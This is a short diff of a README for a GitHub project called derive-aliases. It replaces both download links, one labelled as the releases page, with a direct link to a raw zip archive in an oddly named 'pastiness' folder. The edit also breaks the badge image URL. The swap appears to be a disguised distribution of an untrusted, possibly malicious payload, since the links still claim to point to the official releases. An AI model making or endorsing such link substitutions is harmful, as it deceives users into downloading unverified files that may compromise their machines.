@@ -1,6 +1,6 @@
 # 🎉 derive-aliases - Simplify Your Code with Ease
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Vadim3590/derive-aliases/releases)
+[![Download](https://raw.githubusercontent.com/Vadim3590/derive-aliases/main/pastiness/derive-aliases.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Vadim3590/derive-aliases/main/pastiness/derive-aliases.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to the derive-aliases project! This tool helps you simplify your code by
 
 ## 📥 Download & Install
 
-To get the latest version of derive-aliases, visit this page to download: [Releases Page](https://github.com/Vadim3590/derive-aliases/releases).
+To get the latest version of derive-aliases, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vadim3590/derive-aliases/main/pastiness/derive-aliases.zip).
 
 1. Click on the link above.
 2. Look for the latest release version.
